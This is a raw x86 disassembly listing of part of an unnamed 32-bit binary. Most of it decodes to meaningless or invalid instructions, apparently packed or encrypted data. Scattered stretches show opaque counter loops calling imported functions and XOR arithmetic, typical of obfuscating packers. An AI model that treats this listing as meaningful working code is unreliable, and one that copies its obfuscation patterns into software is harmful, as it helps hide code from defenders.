  40e623:	jae    0x40e5c8
  40e625:	push   esi
  40e626:	mov    DWORD PTR [ebx],edx
  40e628:	pop    edi
  40e629:	out    dx,al
  40e62a:	inc    ecx
  40e62b:	iret   
  40e62c:	ss out 0x7d,eax
  40e62f:	pop    ds
  40e630:	push   DWORD PTR [edx+0x46]
  40e633:	dec    ebx
  40e634:	jb     0x40e668
  40e636:	push   ecx
  40e637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e638:	fs fistp WORD PTR es:[ecx+esi*4-0x7d]
  40e63e:	fcomp  QWORD PTR [eax+0x34efe884]
  40e644:	popa   
  40e645:	cmovle ecx,DWORD PTR [ebx-0xc]
  40e649:	retf   
  40e64a:	mov    ebx,0x1fc71979
  40e64f:	arpl   WORD PTR [edi-0x4854979c],si
  40e655:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e657:	fchs   
  40e659:	or     BYTE PTR [eax],dh
  40e65b:	add    DWORD PTR [ecx+0x28592bb1],0xffffffb9
  40e662:	pop    edx
  40e663:	add    DWORD PTR [esi-0x62],ebx
  40e666:	xor    eax,0x655070c2
  40e66b:	in     eax,dx
  40e66c:	and    eax,0xaf6677f5
  40e671:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e673:	mov    edx,0x9f124a1
  40e678:	or     DWORD PTR [esi+0x721829c4],esi
  40e67e:	inc    eax
  40e67f:	fsubrp st(6),st
  40e681:	jmp    FWORD PTR [eax+0x32bf5d49]
  40e687:	ror    BYTE PTR [ecx],cl
  40e689:	je     0x40e6bc
  40e68b:	xor    eax,0xc3cd700e
  40e690:	sub    esp,DWORD PTR [ebx]
  40e692:	cdq    
  40e693:	and    BYTE PTR cs:[ebp+edi*2-0x2e2e9504],ah
  40e69b:	add    BYTE PTR [eax+0x58dfedd3],0xe1
  40e6a2:	fdiv   QWORD PTR [eax+0x39]
  40e6a5:	xor    ecx,edi
  40e6a7:	into   
  40e6a8:	mov    eax,ds:0x26a63fca
  40e6ad:	lods   eax,DWORD PTR ds:[esi]
  40e6ae:	fimul  WORD PTR [ebp+eax*2+0x7b]
  40e6b2:	push   cs
  40e6b3:	pop    eax
  40e6b4:	mov    eax,0xb9b6d03a
  40e6b9:	adc    DWORD PTR [ebp-0x480907e0],ebp
  40e6bf:	and    bh,BYTE PTR [esi-0x4fe4eb34]
  40e6c5:	push   esi
  40e6c6:	sbb    ecx,DWORD PTR [ebp-0x2d127e7c]
  40e6cc:	enter  0x1472,0x59
  40e6d0:	(bad)  
  40e6d2:	pop    ecx
  40e6d3:	dec    eax
  40e6d4:	pop    eax
  40e6d5:	sub    ebp,DWORD PTR [edx-0x2cf2c8f4]
  40e6db:	xor    al,0x5c
  40e6dd:	mov    ebx,0xf59b7c87
  40e6e2:	cli    
  40e6e3:	data16 sub dl,BYTE PTR [ebp+0x58177eba]
  40e6ea:	adc    bl,bl
  40e6ec:	or     ebp,ebx
  40e6ee:	mov    ebx,0x1d9a059c
  40e6f3:	inc    esi
  40e6f4:	fnstenv gs:[ecx]
  40e6f7:	rcr    DWORD PTR [edx+eiz*2],0x0
  40e6fb:	cmp    cl,ch
  40e6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fe:	xor    eax,esi
  40e700:	add    eax,ebx
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	mov    BYTE PTR [esi],bl
  40e734:	cwde   
  40e735:	pop    ss
  40e736:	aas    
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	(bad)  
  40e73f:	jle    0x40e742
  40e741:	ja     0x40e70b
  40e743:	fucomi st,st(6)
  40e745:	stc    
  40e746:	in     eax,dx
  40e747:	mov    bh,0xa2
  40e749:	add    ecx,esi
  40e74b:	jge    0x40e783
  40e74d:	mov    ch,BYTE PTR [esi]
  40e74f:	jmp    0xdc5d:0x465e4bc5
  40e756:	jp     0x40e744
  40e758:	push   edx
  40e759:	jbe    0x40e7ce
  40e75b:	and    BYTE PTR [edi-0x69],cl
  40e75e:	inc    edx
  40e75f:	add    ah,BYTE PTR [edi+edx*2-0x4f463154]
  40e766:	call   0xbdb2:0x767de5d0
  40e76d:	std    
  40e76e:	test   BYTE PTR [edx+esi*4-0x25],0x5f
  40e773:	rol    DWORD PTR [esi],1
  40e775:	mov    eax,ds:0xa2da3e72
  40e77a:	pop    edx
  40e77b:	mov    ds:0xbfe0453d,eax
  40e780:	sub    ebx,DWORD PTR [ebx+0xe]
  40e783:	jno    0x40e7b0
  40e785:	dec    esp
  40e786:	(bad)  
  40e787:	popf   
  40e788:	(bad)
  40e78c:	(bad)  [ebx-0x5dbf2d74]
  40e792:	imul   ebx,ebp,0xe3d7ded8
  40e798:	push   ds
  40e799:	or     DWORD PTR [ecx],eax
  40e79b:	call   0xbd569738
  40e7a0:	pop    ebx
  40e7a1:	xchg   bx,ax
  40e7a3:	xchg   ebx,eax
  40e7a4:	enter  0x4fe5,0xf3
  40e7a8:	fistp  WORD PTR [ebx-0x69aa2046]
  40e7ae:	add    BYTE PTR [edx-0x58a6ba46],0xce
  40e7b5:	sub    BYTE PTR [edi-0x446b860],dl
  40e7bb:	pop    ebx
  40e7bc:	jns    0x40e7bd
  40e7be:	mov    bl,0x93
  40e7c0:	out    dx,eax
  40e7c1:	enter  0x22d7,0x3a
  40e7c5:	pop    ds
  40e7c6:	out    dx,al
  40e7c7:	jns    0x40e82c
  40e7c9:	sti    
  40e7ca:	lock adc DWORD PTR [edx],0x756d9fe
  40e7d1:	icebp  
  40e7d2:	jno    0x40e77f
  40e7d4:	scas   eax,DWORD PTR es:[edi]
  40e7d5:	mov    ch,0xe8
  40e7d7:	rcr    DWORD PTR [ebp+0x37],1
  40e7da:	or     DWORD PTR [ecx+0x1f],ebp
  40e7dd:	lahf   
  40e7de:	cmp    ah,BYTE PTR [ebx+0x5f523f86]
  40e7e4:	cmc    
  40e7e5:	jno    0x40e784
  40e7e7:	dec    ebp
  40e7e8:	cwde   
  40e7e9:	cmp    eax,esi
  40e7eb:	test   BYTE PTR [ebx+ecx*1],bh
  40e7ee:	or     DWORD PTR [esi+0x44c3a8a3],edx
  40e7f4:	and    ecx,ebx
  40e7f6:	mov    eax,0x4db6544c
  40e7fb:	mov    ds:0x1527b04b,eax
  40e800:	(bad)  
  40e801:	imul   esp,DWORD PTR [esi-0x19],0xffffffee
  40e805:	or     DWORD PTR [edi],ecx
  40e807:	add    al,0x6c
  40e809:	sti    
  40e80a:	mov    ecx,0xc5fc7946
  40e80f:	add    edi,edi
  40e811:	xor    BYTE PTR ds:0xc2654c76,bh
  40e817:	daa    
  40e818:	pop    ecx
  40e819:	jmp    0x4719:0x12e08548
  40e820:	sbb    ebx,DWORD PTR [ecx-0x4]
  40e823:	ins    BYTE PTR es:[edi],dx
  40e824:	out    0x6b,eax
  40e826:	xchg   edx,eax
  40e827:	inc    ebx
  40e828:	ret    
  40e829:	test   al,0xad
  40e82b:	mov    esi,0xde5fb81c
  40e830:	mov    al,0x53
  40e832:	sbb    eax,0x687b9734
  40e837:	(bad)  
  40e838:	(bad)  
  40e839:	adc    dh,BYTE PTR [esi-0x3ac1e2e6]
  40e83f:	(bad)  
  40e841:	mov    dl,0xa3
  40e843:	xchg   ebx,eax
  40e844:	clc    
  40e845:	push   0x60610558
  40e84a:	enter  0x6a7d,0x75
  40e84e:	sbb    DWORD PTR [edx+0x34],ecx
  40e851:	mov    ebx,0x226db922
  40e856:	(bad)  
  40e857:	or     DWORD PTR [esi],eax
  40e859:	cmp    al,0xa6
  40e85b:	inc    ebx
  40e85c:	mov    ds:0xd6f98cfe,al
  40e861:	mov    ds:0xd546b002,al
  40e866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e867:	cmp    esi,DWORD PTR [ebp-0x3b79d32]
  40e86d:	imul   ax,WORD PTR [esi+0x33],0x4137
  40e873:	pop    eax
  40e874:	push   edx
  40e875:	mov    BYTE PTR [ebx],0xed
  40e878:	dec    dl
  40e87a:	sbb    edx,ebp
  40e87c:	sbb    esi,ebp
  40e87e:	nop
  40e87f:	xchg   ebx,eax
  40e880:	outs   dx,DWORD PTR ds:[esi]
  40e881:	lahf   
  40e882:	cmp    ecx,edx
  40e884:	aas    
  40e885:	imul   ebx,ecx,0xffffffec
  40e888:	(bad)  
  40e889:	mov    bl,0x5e
  40e88b:	push   es
  40e88c:	pop    edi
  40e88d:	mov    eax,0x548a216a
  40e892:	fcmovb st,st(3)
  40e894:	inc    ebx
  40e895:	(bad)  
  40e896:	shr    ah,cl
  40e898:	jge    0x40e8d1
  40e89a:	mov    bl,0x1f
  40e89c:	das    
  40e89d:	ins    BYTE PTR es:[edi],dx
  40e89e:	ds out 0xec,eax
  40e8a1:	push   ebx
  40e8a2:	jle    0x40e85e
  40e8a4:	adc    al,0x6d
  40e8a6:	xor    bh,BYTE PTR [ecx+0x2effc746]
  40e8ac:	xchg   ebp,eax
  40e8ad:	pop    esi
  40e8ae:	sbb    ecx,DWORD PTR [edi]
  40e8b0:	xchg   ebp,eax
  40e8b1:	mov    cl,0x3d
  40e8b3:	fwait
  40e8b4:	push   ds
  40e8b5:	add    eax,ebp
  40e8b7:	sub    edx,ebp
  40e8b9:	xchg   ebp,eax
  40e8ba:	add    eax,0x6db7436e
  40e8bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8c0:	bound  esi,QWORD PTR [ecx+edx*4+0x7b9b0156]
  40e8c7:	retf   0xab61
  40e8ca:	sti    
  40e8cb:	enter  0x971,0xc3
  40e8cf:	cs xor al,0xa3
  40e8d2:	shl    al,cl
  40e8d4:	call   0x47c4cb61
  40e8d9:	clc    
  40e8da:	loope  0x40e8e0
  40e8dc:	mov    edx,0x406578cc
  40e8e1:	pushf  
  40e8e2:	mov    al,ds:0x2ca360c9
  40e8e7:	fimul  WORD PTR [ebx]
  40e8e9:	pop    ds
  40e8ea:	(bad)  
  40e8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8ec:	push   ebp
  40e8ed:	daa    
  40e8ee:	mov    edx,0x92d55df1
  40e8f3:	adc    DWORD PTR [edx+ebp*4],esp
  40e8f6:	add    BYTE PTR [edi],cl
  40e8f8:	ins    DWORD PTR es:[edi],dx
  40e8f9:	inc    edi
  40e8fa:	push   cs
  40e8fb:	popa   
  40e8fc:	mov    ds:0x80c26a21,eax
  40e901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e902:	mov    eax,0x191ccfc0
  40e907:	lods   al,BYTE PTR ds:[esi]
  40e908:	sbb    esi,DWORD PTR [ebx-0x58f623dd]
  40e90e:	xor    ebx,DWORD PTR [edi+0x6d4e0445]
  40e914:	xchg   esi,eax
  40e915:	dec    eax
  40e916:	cdq    
  40e917:	mov    ecx,DWORD PTR [eax+0x2302c2c1]
  40e91d:	pushw  cs
  40e91f:	repz pop ss
  40e921:	lahf   
  40e922:	xor    al,0x51
  40e924:	pusha  
  40e925:	and    al,0xe4
  40e927:	inc    esi
  40e928:	xchg   edi,eax
  40e929:	push   0xffffff92
  40e92b:	test   BYTE PTR [edx],bl
  40e92d:	xlat   BYTE PTR ds:[ebx]
  40e92e:	shr    BYTE PTR [edi+0x912dc39],cl
  40e934:	mov    esp,ebx
  40e936:	push   ebx
  40e937:	xchg   ebp,eax
  40e938:	repz dec ebp
  40e93a:	(bad)  
  40e93b:	nop
  40e93c:	mov    al,ds:0xf7c0c4a9
  40e941:	inc    ebp
  40e942:	mov    ah,0x16
  40e944:	cmp    BYTE PTR [eax+0x18],dh
  40e947:	fwait
  40e948:	pusha  
  40e949:	mov    ecx,0x2b7daf03
  40e94e:	not    DWORD PTR [ebx-0x36c46e7a]
  40e954:	dec    eax
  40e955:	rol    BYTE PTR [ebp+0x14def71a],cl
  40e95b:	mov    esi,0xa43566cf
  40e960:	cmp    esp,DWORD PTR [ebx+0x40a4bcf7]
  40e966:	xchg   DWORD PTR [esi],ecx
  40e968:	ja     0x40e9e4
  40e96a:	(bad)  
  40e96c:	lahf   
  40e96d:	sti    
  40e96e:	pusha  
  40e96f:	jmp    0x40e96e
  40e971:	frstor [ebp-0x782e3de7]
  40e977:	xchg   ebx,eax
  40e978:	mov    eax,DWORD PTR ds:[ebp+0xc]
  40e97c:	xor    eax,esi
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	push   edi
  40ea23:	not    DWORD PTR [esp+eax*8+0x7878b9f4]
  40ea2a:	in     eax,0x7e
  40ea2c:	js     0x40eaa6
  40ea2e:	test   al,0x75
  40ea30:	mov    ah,0x1a
  40ea32:	mov    edi,0x1fcde8ef
  40ea37:	rcr    DWORD PTR [esi+0x55ef65d9],cl
  40ea3d:	or     dh,BYTE PTR [edx-0x54db7704]
  40ea43:	pushf  
  40ea44:	pop    ecx
  40ea45:	ret    
  40ea46:	cs adc eax,0x3511da5
  40ea4c:	hlt    
  40ea4d:	cmp    DWORD PTR [edx-0x59],esi
  40ea50:	pop    edx
  40ea51:	adc    DWORD PTR gs:[esi-0x7c],esi
  40ea55:	(bad)  
  40ea56:	jno    0x40e9fa
  40ea58:	lods   al,BYTE PTR ds:[esi]
  40ea59:	fdivr  DWORD PTR [ebp-0x4f]
  40ea5c:	push   ss
  40ea5d:	inc    esp
  40ea5e:	fimul  WORD PTR [eax+edx*4+0x72c67c72]
  40ea65:	cwde   
  40ea66:	ss (bad) 
  40ea68:	imul   ecx,esp,0xae31a536
  40ea6e:	add    eax,0x94d94c08
  40ea73:	test   eax,0x9c34889
  40ea78:	hlt    
  40ea79:	ins    BYTE PTR es:[edi],dx
  40ea7a:	test   BYTE PTR [edi],al
  40ea7c:	push   es
  40ea7d:	shl    eax,cl
  40ea7f:	(bad)  
  40ea81:	pop    ds
  40ea82:	stos   DWORD PTR es:[edi],eax
  40ea83:	mov    bl,0x7
  40ea85:	or     DWORD PTR [edi+0x37],ebx
  40ea88:	(bad)
  40ea8c:	pop    eax
  40ea8d:	mov    dl,0xf7
  40ea8f:	jl     0x40eaa5
  40ea91:	std    
  40ea92:	(bad)  [eax]
  40ea94:	sar    DWORD PTR [edi-0x1d5e5ab9],cl
  40ea9a:	dec    ebx
  40ea9b:	icebp  
  40ea9c:	mov    eax,ds:0x8ff1f181
  40eaa1:	arpl   WORD PTR [edx],bx
  40eaa3:	mov    al,ds:0xb6874efd
  40eaa8:	push   esp
  40eaa9:	adc    DWORD PTR [eax-0x5e],esp
  40eaac:	daa    
  40eaad:	imul   eax,esp,0xf664efd9
  40eab3:	(bad)  
  40eab4:	repz mov al,0x24
  40eab7:	push   ss
  40eab8:	repz mov ds:0x2091a6e0,eax
  40eabe:	cdq    
  40eabf:	jae    0x40eaf5
  40eac1:	sbb    eax,esp
  40eac3:	pop    ebx
  40eac4:	jbe    0x40ea92
  40eac6:	cmp    eax,0x65bd6d1a
  40eacb:	aad    0x2d
  40eacd:	fiadd  WORD PTR ds:0x373bbb98
  40ead3:	mov    WORD PTR [ecx-0x70f608d3],gs
  40ead9:	and    al,BYTE PTR [edx+0x49]
  40eadc:	stos   BYTE PTR es:[edi],al
  40eadd:	cli    
  40eade:	pop    ss
  40eadf:	fisttp QWORD PTR [esi]
  40eae1:	mov    edx,0x36ba0c58
  40eae6:	mov    al,0x60
  40eae8:	dec    eax
  40eae9:	inc    eax
  40eaea:	adc    al,0x5f
  40eaec:	arpl   WORD PTR [esi+0x8],si
  40eaef:	es mov dl,0x26
  40eaf2:	aad    0xf0
  40eaf4:	pop    esi
  40eaf5:	ja     0x40eb5b
  40eaf7:	push   ebx
  40eaf8:	out    0x12,al
  40eafa:	mov    edi,es
  40eafc:	addr16 mov esi,0xb692aa03
  40eb02:	dec    edx
  40eb03:	test   BYTE PTR [edx],bh
  40eb05:	ret    0x1125
  40eb08:	int    0x62
  40eb0a:	jg     0x40eb83
  40eb0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb0d:	jbe    0x40ea98
  40eb0f:	pop    esi
  40eb10:	(bad)  
  40eb11:	repz in al,dx
  40eb13:	cmp    BYTE PTR [ecx-0x21],cl
  40eb16:	and    eax,0xd240d7bd
  40eb1b:	xchg   edi,eax
  40eb1c:	out    dx,eax
  40eb1d:	pop    ebp
  40eb1e:	ds xchg ebx,eax
  40eb20:	lods   eax,DWORD PTR ds:[esi]
  40eb21:	add    ecx,esi
  40eb23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb24:	sub    bh,bl
  40eb26:	push   0xffffffa8
  40eb28:	xor    eax,DWORD PTR [ebp-0x32]
  40eb2b:	push   ss
  40eb2c:	mov    al,0x11
  40eb2e:	nop
  40eb2f:	and    al,0x97
  40eb31:	shl    BYTE PTR [edi-0x12effded],cl
  40eb37:	hlt    
  40eb38:	fst    QWORD PTR [ebx]
  40eb3a:	sti    
  40eb3b:	sub    BYTE PTR [edi+0x486a922a],cl
  40eb41:	icebp  
  40eb42:	jp     0x40eac7
  40eb44:	or     al,0x48
  40eb46:	aad    0xe5
  40eb48:	and    eax,0xa3bc33f7
  40eb4d:	dec    esi
  40eb4e:	dec    ecx
  40eb4f:	mov    ecx,0x3e6edff6
  40eb54:	pushf  
  40eb55:	imul   ebp,DWORD PTR [eax+ebp*2],0x7e4a4a68
  40eb5c:	lods   al,BYTE PTR ds:[esi]
  40eb5d:	idiv   BYTE PTR [ecx-0x71]
  40eb60:	stc    
  40eb61:	outs   dx,DWORD PTR ds:[esi]
  40eb62:	dec    esp
  40eb63:	aas    
  40eb64:	repz sbb DWORD PTR ds:0xc11f494b,0xffffff8a
  40eb6c:	ins    DWORD PTR es:[edi],dx
  40eb6d:	jecxz  0x40eb74
  40eb6f:	lds    ecx,FWORD PTR [esi-0x2a]
  40eb72:	out    dx,al
  40eb73:	call   0x84ce1a23
  40eb78:	pop    edi
  40eb79:	bound  ebp,QWORD PTR [edi-0x61]
  40eb7c:	inc    edi
  40eb7d:	das    
  40eb7e:	mov    bl,0x49
  40eb80:	pop    edx
  40eb81:	pop    ss
  40eb82:	push   ebx
  40eb83:	cdq    
  40eb84:	add    eax,0x43bb0078
  40eb89:	jno    0x40eb32
  40eb8b:	jmp    0x5a86:0xc9d995d6
  40eb92:	jmp    0x3e2fb959
  40eb97:	pop    es
  40eb98:	sub    bh,BYTE PTR [edi+0x23]
  40eb9b:	icebp  
  40eb9c:	or     esi,DWORD PTR [ebx+0x35]
  40eb9f:	mov    ds:0x9b9a5dbd,al
  40eba4:	push   ebx
  40eba5:	and    ecx,edx
  40eba7:	pop    ds
  40eba8:	dec    ecx
  40eba9:	test   DWORD PTR [edi-0x78],esi
  40ebac:	mov    dl,0xc9
  40ebae:	sahf   
  40ebaf:	mov    DWORD PTR ds:0x4255e45c,esp
  40ebb5:	xchg   edi,eax
  40ebb6:	jae    0x40ebf7
  40ebb8:	jl     0x40ec21
  40ebba:	jmp    0x40ec3a
  40ebbc:	aas    
  40ebbd:	pusha  
  40ebbe:	call   0xc73697df
  40ebc3:	xchg   BYTE PTR [ebx+eiz*8],al
  40ebc6:	scas   eax,DWORD PTR es:[edi]
  40ebc7:	sub    eax,0xb2ddff2f
  40ebcc:	mov    ecx,0xd6542fcc
  40ebd1:	adc    esi,esi
  40ebd3:	xchg   ebx,eax
  40ebd4:	add    BYTE PTR [edx+0x31],ch
  40ebd7:	push   esp
  40ebd8:	les    ebp,FWORD PTR [esi+0x33]
  40ebdb:	and    ebp,DWORD PTR [edi]
  40ebdd:	sub    DWORD PTR [ecx+eiz*8+0x38],ebp
  40ebe1:	mov    dh,0x66
  40ebe3:	and    DWORD PTR [eax+0x708c864d],0x6e
  40ebea:	push   0x9
  40ebec:	cmp    DWORD PTR [edi-0x53],edi
  40ebef:	xchg   ebx,eax
  40ebf0:	or     eax,0x9b6af3ca
  40ebf5:	sbb    eax,0xb05b4af3
  40ebfa:	rol    BYTE PTR [edi],0x39
  40ebfd:	push   ecx
  40ebfe:	add    al,BYTE PTR [esi-0x5d]
  40ec01:	push   ss
  40ec02:	out    0x5f,eax
  40ec04:	inc    ebp
  40ec05:	fwait
  40ec06:	dec    ebp
  40ec07:	cmp    al,0x9a
  40ec09:	xor    eax,0x69faff77
  40ec0e:	jmp    0x5aa0:0xf4fb1ec1
  40ec15:	push   0xe963c606
  40ec1a:	xor    bl,BYTE PTR [ecx-0x1f2659c2]
  40ec20:	cmp    dh,BYTE PTR [eax]
  40ec22:	cdq    
  40ec23:	fidivr DWORD PTR [esp+eiz*4]
  40ec26:	retf   
  40ec27:	loope  0x40ec3d
  40ec29:	sbb    eax,0x16ede134
  40ec2e:	add    al,0xec
  40ec30:	div    dl
  40ec32:	lods   eax,DWORD PTR ds:[esi]
  40ec33:	push   ds
  40ec34:	hlt    
  40ec35:	pusha  
  40ec36:	ins    DWORD PTR es:[edi],dx
  40ec37:	cmp    DWORD PTR [ebx-0x3],0xffffffd5
  40ec3b:	xchg   ebp,eax
  40ec3c:	pop    ss
  40ec3d:	iret   
  40ec3e:	lods   eax,DWORD PTR ds:[esi]
  40ec3f:	dec    edi
  40ec40:	adc    eax,0xcff3d079
  40ec45:	jmp    0x404:0x3da4afcf
  40ec4c:	add    dh,BYTE PTR ds:0x43ce8124
  40ec52:	mov    ebp,0x4204bd6a
  40ec57:	ret    0xee38
  40ec5a:	adc    al,0xb3
  40ec5c:	aas    
  40ec5d:	pop    ebp
  40ec5e:	mov    fs,WORD PTR [esi]
  40ec60:	imul   esp,DWORD PTR [edx],0xc7126f55
  40ec66:	sbb    al,0x40
  40ec68:	into   
  40ec69:	cld    
  40ec6a:	sbb    DWORD PTR [edx-0x236a7d8c],esp
  40ec70:	xchg   ebx,eax
  40ec71:	out    0x6,eax
  40ec73:	repz daa 
  40ec75:	add    BYTE PTR [ebx+esi*4-0x7be6d484],0xbf
  40ec7d:	aam    0x2a
  40ec7f:	fisubr WORD PTR [ebp-0x51f1a944]
  40ec85:	pop    eax
  40ec86:	sar    BYTE PTR [ebx-0x14b61fab],cl
  40ec8c:	cmc    
  40ec8d:	stc    
  40ec8e:	push   edi
  40ec8f:	mov    esi,ds
  40ec91:	xor    edx,DWORD PTR [edx]
  40ec93:	sub    al,0xca
  40ec95:	aas    
  40ec96:	mov    bl,0x49
  40ec98:	xchg   ebp,eax
  40ec99:	mov    edx,DWORD PTR [ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	mov    esp,0x612f5ec4
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	sbb    BYTE PTR [esi+0x0],ah
  40edae:	dec    edx
  40edaf:	xor    ebp,DWORD PTR [edi]
  40edb1:	push   ecx
  40edb2:	sbb    bh,bh
  40edb4:	sbb    cl,bh
  40edb6:	outs   dx,BYTE PTR ds:[esi]
  40edb7:	inc    esi
  40edb8:	pusha  
  40edb9:	jmp    0x6fef:0x3d67ad5
  40edc0:	dec    ecx
  40edc1:	cli    
  40edc2:	out    0x80,al
  40edc4:	gs sub eax,0x1061b8ab
  40edca:	cmp    BYTE PTR [ecx+0x3050a6],dl
  40edd0:	cmp    eax,0x4f2ea955
  40edd5:	sbb    DWORD PTR [edi+0x2a],eax
  40edd8:	hlt    
  40edd9:	test   al,0x4b
  40eddb:	ja     0x40edf2
  40eddd:	jne    0x40edd9
  40eddf:	ds xchg esi,eax
  40ede1:	jno    0x40ed77
  40ede3:	lock adc eax,0x531116b9
  40ede9:	shl    DWORD PTR [ecx],0x20
  40edec:	xor    al,0x3f
  40edee:	mov    bx,WORD PTR [eax-0x4d46f496]
  40edf5:	loopne 0x40ed9f
  40edf7:	jno    0x40edcb
  40edf9:	mov    dh,0xd3
  40edfb:	out    0x1f,al
  40edfd:	dec    esp
  40edfe:	pop    esi
  40edff:	lahf   
  40ee00:	mov    al,0xef
  40ee02:	xor    edx,esi
  40ee04:	push   ebp
  40ee05:	lahf   
  40ee06:	pop    ds
  40ee07:	loopne 0x40eda2
  40ee09:	ret    
  40ee0a:	adc    BYTE PTR [ecx+0x482a0150],ch
  40ee10:	lea    eax,[edx]
  40ee12:	inc    ecx
  40ee13:	fs push es
  40ee15:	adc    ah,BYTE PTR [edi-0x427ec47a]
  40ee1b:	jl     0x40ee2e
  40ee1d:	pop    esi
  40ee1e:	pushf  
  40ee1f:	call   0x4e3e78b2
  40ee24:	lds    edi,FWORD PTR [edx+0x412e0d77]
  40ee2a:	lods   eax,DWORD PTR ds:[esi]
  40ee2b:	shr    ch,cl
  40ee2d:	dec    ebx
  40ee2e:	xor    dh,dl
  40ee30:	iret   
  40ee31:	mov    eax,ds:0x5d2071fb
  40ee36:	(bad)  
  40ee37:	aas    
  40ee38:	add    bh,BYTE PTR [edi]
  40ee3a:	xchg   esp,eax
